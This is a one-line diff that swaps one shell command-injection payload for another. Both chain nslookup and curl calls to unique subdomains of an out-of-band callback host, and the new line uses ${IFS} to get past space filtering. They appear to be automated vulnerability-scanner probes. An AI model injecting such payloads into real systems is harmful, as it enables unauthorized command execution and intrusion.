@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitintboyuqxi4c286.bxss.me||curl hitintboyuqxi4c286.bxss.me)|(nslookup -q=cname hitintboyuqxi4c286.bxss.me||curl hitintboyuqxi4c286.bxss.me)&(nslookup -q=cname hitintboyuqxi4c286.bxss.me||curl hitintboyuqxi4c286.bxss.me)
+|(nslookup${IFS}-q${IFS}cname${IFS}hitccnvncmcjg942c9.bxss.me||curl${IFS}hitccnvncmcjg942c9.bxss.me)
